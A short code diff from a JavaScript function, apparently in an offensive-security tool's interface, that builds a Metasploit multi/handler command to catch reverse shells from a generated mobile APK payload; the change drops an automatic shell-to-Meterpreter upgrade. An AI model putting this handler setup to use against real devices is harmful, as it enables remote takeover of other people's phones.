@@ -8488,7 +8488,7 @@ function bMobApk() {
   // Build matching handler command
   const hCmd = 'msfconsole -q -x "use multi/handler; set PAYLOAD ' + pl +
     '; set LHOST ' + lhost + '; set LPORT ' + lport +
-    '; set ExitOnSession false; set AutoRunScript post/multi/manage/shell_to_meterpreter; exploit -j"';
+    '; set ExitOnSession false; exploit -j"';
   const hEl = document.getElementById('mob-handler-cmd');
   if (hEl) hEl.textContent = hCmd;
 }
